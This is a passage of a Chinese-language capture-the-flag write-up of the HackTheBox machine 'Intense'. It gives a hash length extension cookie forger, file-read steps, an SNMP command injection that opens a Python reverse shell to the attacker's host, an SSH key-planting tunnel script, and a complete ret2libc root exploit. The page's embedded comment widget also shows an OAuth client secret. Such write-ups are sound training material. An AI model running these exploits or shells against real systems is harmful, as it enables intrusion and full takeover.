b64encode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="comment">#We know the guest data : (b'username=guest;secret=84983c60f7daadc1cb8698621f802c0d9f9a3c3c295c810748fb048115c186ec;')</span></span><br><span class="line"><span class="comment">#We know the guest signature : (b'\xf2\x02\x86\xc9\xa5\xb3\x14\x1eO\x8cf4h(\xce\xd5|\xec2f\x04~\xf3W&#123;\x0f\xef\xf5\rq\xfe%') and it's length 32.</span></span><br><span class="line"><span class="comment">#We can perform Hash extension attack.</span></span><br><span class="line"><span class="comment">#Replace the admin secret below</span></span><br><span class="line">form_1 = <span class="string">';username=admin;secret=f1fc12010c094016def791e1435ddfdcaeccf8250e36630c0bc93285c2971105;'</span></span><br><span class="line"><span class="comment">#This part will be readable part in cookie, the rest is we have to find by using the length we found in Guest's cookie</span></span><br><span class="line">target = <span class="string">"http://10.10.10.195"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cookie</span><span class="params">()</span>:</span></span><br><span class="line">    session = requests.Session()</span><br><span class="line">    res = session.post(target + <span class="string">"/postlogin"</span>, data = &#123;<span class="string">"username"</span>: <span class="string">"guest"</span>, <span class="string">"password"</span>: <span class="string">"guest"</span>&#125;)</span><br><span class="line">    <span class="keyword">return</span> session.cookies[<span class="string">"auth"</span>]</span><br><span class="line"></span><br><span class="line">cookie = get_cookie()</span><br><span class="line"></span><br><span class="line">(b64_data, b64_sig) = cookie.split(<span class="string">'.'</span>)</span><br><span class="line">data = b64decode(b64_data)</span><br><span class="line">sig = b64decode(b64_sig)</span><br><span class="line">print(<span class="string">'################## The First part'</span>)</span><br><span class="line">print(<span class="string">'data = '</span> + str(data) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'################## The Second part'</span>)</span><br><span class="line">print(<span class="string">'sig = '</span> + str(sig) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#Hashpumpy Module to perform Hash extension Attack.</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">50</span>):</span><br><span class="line">    (sigma, datum) = hashpumpy.hashpump(sig.encode(<span class="string">'hex'</span>), data, form_1, i)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Sigma= "</span> + sigma)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Datum= "</span> + datum)</span><br><span class="line">    dat1 = b64encode(datum).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    sig1 = b64encode(binascii.unhexlify(sigma)).decode(<span class="string">'utf-8'</span>)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Sig1= "</span> + sig1)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"Dat1= "</span> + dat1)</span><br><span class="line">    cookie = dat1 + <span class="string">"."</span> + sig1</span><br><span class="line">    print(<span class="string">"cookie: &#123;&#125;"</span>.format(i))</span><br><span class="line">    print(cookie + <span class="string">'\n'</span>)</span><br><span class="line">    req = requests.get(target + <span class="string">"/admin"</span>, cookies = &#123; <span class="string">"auth"</span> : cookie &#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Forbidden"</span> <span class="keyword">not</span> <span class="keyword">in</span> req.text:</span><br><span class="line">        print(<span class="string">"[+] FOUND"</span>)</span><br><span class="line">        print(<span class="string">"admin cookie: "</span> + str(cookie))</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<h1 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h1><p>根据代码我们知道admin有log view和list功能，页面上没有入口，我们可以直接去访问接口,然后存在目录遍历以及任意文件读取(注意点：如果无法获得内容，加个header<code>Content-Type: application/x-www-form-urlencoded</code>)：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082611.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082612.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>注意得到的用户，可以知道有snmp</p>
<h1 id="user-flag"><a href="#user-flag" class="headerlink" title="user flag"></a>user flag</h1><p>直接利用任意文件读取即可得到user.txt:</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082613.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h1 id="SNMP"><a href="#SNMP" class="headerlink" title="SNMP"></a>SNMP</h1><p>前面知道有snmp，那么就读取snmp配置文件,可以得到RWcommunity：</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082614.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<p>然后根据这篇文章，SNMP任意命令执行：</p>
<ul>
<li>SNMP Arbitrary Command Execution. SNMP, the Simple Network Management… | by Kert Ojasoo | The RangeForce CyberSecurity Blog | Medium<br><a href="https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e" target="_blank" rel="noopener">https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e</a></li>
</ul>
<h2 id="snmpset"><a href="#snmpset" class="headerlink" title="snmpset"></a>snmpset</h2><p>如果运行出错的话，先运行这几条</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install snmp-mibs-downloader</span><br><span class="line">sudo download-mibs</span><br><span class="line">sudo echo "" &gt; /etc/snmp/snmp.conf</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 &#39;nsExtendStatus.&quot;evilcommand&quot;&#39; &#x3D; createAndGo &#39;nsExtendCommand.&quot;evilcommand&quot;&#39; &#x3D; &#x2F;usr&#x2F;bin&#x2F;python3 &#39;nsExtendArgs.&quot;evilcommand&quot;&#39; &#x3D; &#39;-c &quot;import sys,socket,os,pty;s&#x3D;socket.socket();s.connect((\&quot;10.10.14.18\&quot;,4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\&quot;&#x2F;bin&#x2F;sh\&quot;)&quot;&#39;</span><br><span class="line"></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br></pre></td></tr></table></figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082615.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>



<h2 id="debian-snmp-shell-sh"><a href="#debian-snmp-shell-sh" class="headerlink" title="debian-snmp-shell.sh"></a>debian-snmp-shell.sh</h2><p>可以脚本自动一套：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">random=<span class="string">"gunroot"</span></span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"<span class="variable">$&#123;random&#125;</span>\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"<span class="variable">$&#123;random&#125;</span>\""</span> = /usr/bin/python3 \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"<span class="variable">$&#123;random&#125;</span>\""</span>    = <span class="string">'-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.18\",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br></pre></td></tr></table></figure>

<h1 id="note-server"><a href="#note-server" class="headerlink" title="note_server"></a>note_server</h1><p>服务器5001端口以root权限跑着一个note_server，分析调试过程详细参考官方wp视频：</p>
<ul>
<li>HackTheBox - Intense - YouTube<br><a href="https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec</a></li>
</ul>
<h1 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h1><p>转发端口，ret2libc得到root shell</p>
<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082616.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<figure class="image-bubble">
                <div class="img-lightbox">
                    <div class="overlay"></div>
                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images2020/master/2020082617.jpg" alt="" title="">
                </div>
                <div class="image-caption"></div>
            </figure>

<h2 id="tunnel-sh"><a href="#tunnel-sh" class="headerlink" title="tunnel.sh"></a>tunnel.sh</h2><p>有防火墙，ssh连接后秒断，但可以ssh转发端口：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line">ssh-keygen -b 2048 -t ed25519 -f ./key -q -N <span class="string">""</span></span><br><span class="line">key=$(cat key.pub)</span><br><span class="line">shitvalue=<span class="string">"lkabeahbf"</span></span><br><span class="line">snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \</span><br><span class="line">    <span class="string">"nsExtendStatus.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span>  = createAndGo \</span><br><span class="line">    <span class="string">"nsExtendCommand.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span> = /bin/bash \</span><br><span class="line">    <span class="string">"nsExtendArgs.\"<span class="variable">$&#123;shitvalue&#125;</span>\""</span>    = <span class="string">"-c \"echo <span class="variable">$&#123;key&#125;</span> &gt;&gt; ~/.ssh/authorized_keys\""</span></span><br><span class="line">snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2</span><br><span class="line">ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i key</span><br></pre></td></tr></table></figure>

<h2 id="pwn-server-py"><a href="#pwn-server-py" class="headerlink" title="pwn_server.py"></a>pwn_server.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'amd64'</span>)</span><br><span class="line"></span><br><span class="line">host = <span class="string">'127.0.0.1'</span></span><br><span class="line">port = <span class="number">5001</span></span><br><span class="line">fd = <span class="number">4</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span><span class="params">(io, note, length=None)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> length <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        length = len(note)</span><br><span class="line"></span><br><span class="line">    io.send(p8(<span class="number">1</span>))</span><br><span class="line">    io.send(p8(length))</span><br><span class="line">    io.send(note)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">copy_note</span><span class="params">(io, offset, copySize)</span>:</span></span><br><span class="line">    io.send(p8(<span class="number">2</span>))</span><br><span class="line">    io.send(p16(offset))</span><br><span class="line">    io.send(p8(copySize))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_notes</span><span class="params">(io, size=None)</span>:</span></span><br><span class="line">    io.send(p8(<span class="number">3</span>))</span><br><span class="line">    <span class="keyword">if</span> size <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">        recv = io.recvall()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        recv = io.recv(size)</span><br><span class="line">    <span class="keyword">return</span> recv</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_to_end</span><span class="params">(io, written=<span class="number">0</span>)</span>:</span></span><br><span class="line">    g = cyclic_gen()</span><br><span class="line">    <span class="keyword">while</span> written &lt; <span class="number">1024</span>:</span><br><span class="line">        chunk = min(<span class="number">255</span>, <span class="number">1024</span> - written)</span><br><span class="line">        write_note(io, g.get(chunk))</span><br><span class="line">        written += chunk</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_rop</span><span class="params">(io, canary, rbp, rop)</span>:</span></span><br><span class="line">    buf = p64(<span class="number">0xDEAD</span>)</span><br><span class="line">    buf += p64(canary)</span><br><span class="line">    buf += p64(rbp)</span><br><span class="line">    buf += rop.chain()</span><br><span class="line"></span><br><span class="line">    write_note(io, buf)</span><br><span class="line">    write_to_end(io, len(buf))</span><br><span class="line">    copy_note(io, <span class="number">0</span>, len(buf))</span><br><span class="line">    read_notes(io, <span class="number">1024</span> + len(buf))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage1</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># stack canary + ebp</span></span><br><span class="line">    io = remote(host,port)</span><br><span class="line">    write_to_end(io)</span><br><span class="line"></span><br><span class="line">    read_size = <span class="number">4</span>*<span class="number">8</span></span><br><span class="line">    copy_note(io, <span class="number">1024</span>, read_size)</span><br><span class="line">    leak = read_notes(io, <span class="number">1024</span>+read_size)[<span class="number">1024</span>:]</span><br><span class="line">    canary = u64(leak[<span class="number">8</span>:<span class="number">16</span>])</span><br><span class="line">    rbp = u64(leak[<span class="number">16</span>:<span class="number">24</span>])</span><br><span class="line">    rip = u64(leak[<span class="number">24</span>:])</span><br><span class="line"></span><br><span class="line">    print(<span class="string">"\nleaks:"</span>)</span><br><span class="line">    print(<span class="string">"rbp = "</span>, hex(rbp))</span><br><span class="line">    print(<span class="string">"canary = "</span>, hex(canary))</span><br><span class="line">    print(<span class="string">"rip = "</span>, hex(rip))</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> (rbp, canary, rip)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage2</span><span class="params">(rbp, canary, rip)</span>:</span></span><br><span class="line">    <span class="comment"># leaking libc</span></span><br><span class="line">    base_address = rip - <span class="number">0xf54</span> <span class="comment"># https://www.youtube.com/watch?v=GTQxZlr5yvE&amp;t=2h14m38s</span></span><br><span class="line">    elf = ELF(<span class="string">"./note_server"</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line">    elf.address = base_address</span><br><span class="line">    rop = ROP(elf)</span><br><span class="line">    rop.write(fd, elf.got[<span class="string">"write"</span>])</span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    do_rop(io, canary, rbp, rop)</span><br><span class="line">    leak = io.recv(<span class="number">8</span>)</span><br><span class="line">    libc_write = u64(leak)</span><br><span class="line">    print(<span class="string">"\nlibc leak: "</span> + hex(libc_write))</span><br><span class="line">    io.close()</span><br><span class="line">    <span class="keyword">return</span> libc_write</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">stage3</span><span class="params">(canary, rbp, libc_write_leak)</span>:</span></span><br><span class="line">    <span class="comment"># get the last 3 bytes and enter them on https://libc.blukat.me</span></span><br><span class="line">    <span class="comment"># then download the libc and set the path here</span></span><br><span class="line">    elf_libc = ELF(<span class="string">"./libc6_2.27-3ubuntu1_amd64.so"</span>, checksec=<span class="keyword">False</span>)</span><br><span class="line">    elf_libc.address = libc_write_leak - elf_libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">    rop_libc = ROP(elf_libc)</span><br><span class="line">    rop_libc.dup2(fd, <span class="number">0</span>)</span><br><span class="line">    rop_libc.dup2(fd, <span class="number">1</span>)</span><br><span class="line">    rop_libc.execve(next(elf_libc.search(<span class="string">b"/bin/sh\x00"</span>)), <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    io = remote(host, port)</span><br><span class="line">    do_rop(io, canary, rbp, rop_libc)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line">(rbp, canary, rip) = stage1()</span><br><span class="line">libc_write_leak = stage2(rbp, canary, rip)</span><br><span class="line">stage3(canary, rbp, libc_write_leak)</span><br></pre></td></tr></table></figure>



<h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul>
<li>[<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md]</a>(<a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL" target="_blank" rel="noopener">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL</a> Injection/SQLite Injection.md)</li>
<li>Everything you need to know about hash length extension attacks » SkullSecurity<br><a href="https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks" target="_blank" rel="noopener">https://blog.skullsecurity.org/2012/everything-you-need-to-know-about-hash-length-extension-attacks</a></li>
<li><a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">https://github.com/bwall/HashPump</a></li>
<li>SNMP Arbitrary Command Execution. SNMP, the Simple Network Management… | by Kert Ojasoo | The RangeForce CyberSecurity Blog | Medium<br><a href="https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e" target="_blank" rel="noopener">https://medium.com/rangeforce/snmp-arbitrary-command-execution-19a6088c888e</a></li>
<li>Doing ret2libc with a Buffer Overflow because of restricted return pointer - bin 0x0F - YouTube<br><a href="https://www.youtube.com/watch?v=m17mV24TgwY" target="_blank" rel="noopener">https://www.youtube.com/watch?v=m17mV24TgwY</a></li>
<li>HackTheBox - Intense 10.10.10.195 - WriteUp - BinaryBiceps<br><a href="https://binarybiceps.com/hackthebox-intense-writeup/?ppwp=1" target="_blank" rel="noopener">https://binarybiceps.com/hackthebox-intense-writeup/?ppwp=1</a></li>
<li>HackTheBox - Intense - YouTube<br><a href="https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec" target="_blank" rel="noopener">https://www.youtube.com/watch?v=nBg6zUalb7c&amp;ab_channel=IppSec</a></li>
</ul>

        </div>

        <blockquote class="post-copyright">
    
    <div class="content">
        
<span class="post-time">
    最后更新时间：<time datetime="2020-11-16T00:39:31.708Z" itemprop="dateUpdated">2020-11-16 08:39:31</time>
</span><br>


        
        水平不济整日被虐这也不会那也得学,脑子太蠢天天垫底这看不懂那学不会
        
    </div>
    
    <footer>
        <a href="https://darkwing.moe">
            <img src="/img/avatar.jpg" alt="暗羽">
            暗羽
        </a>
    </footer>
</blockquote>

        


        <div class="post-footer">
            
	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/HackTheBox/" rel="tag">HackTheBox</a></li></ul>


            
<div class="page-share-wrap">
    

<div class="page-share" id="pageShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&title=《Intense - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&title=《Intense - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/09/01/Intense-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Intense - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>



    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
        <i class="icon icon-share-alt icon-lg"></i>
    </a>
</div>



        </div>
    </div>

    
<nav class="post-nav flex-row flex-justify-between">
  
    <div class="waves-block waves-effect prev">
      <a href="/2020/09/02/Omni-HackTheBox/" id="post-prev" class="post-nav-link">
        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
        <h4 class="title">Omni - HackTheBox</h4>
      </a>
    </div>
  

  
    <div class="waves-block waves-effect next">
      <a href="/2020/08/20/Unbalanced-HackTheBox/" id="post-next" class="post-nav-link">
        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Unbalanced  - HackTheBox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'd35074a248599729ad26',
          clientSecret: 'd208d5902ab831ba7294f942046bcd8da954f9ff',
          repo: 'BlogComments',
          owner: 'zjicmDarkWing',
          admin: ['zjicmDarkWing'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>博客内容遵循 <a rel="license noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享 署名 - 非商业性 - 相同方式共享 4.0 国际协议</a></span>
        </p>
    </div>
    <div class="bottom">
        <p><span>暗羽 &copy; 2014 - 2022</span>
            <span>
                
                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&title=《Intense - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&title=《Intense - HackTheBox》 — 喵喵喵喵&source=安全研究，彼女募集中" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/09/01/Intense-HackTheBox/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Intense - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/09/01/Intense-HackTheBox/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
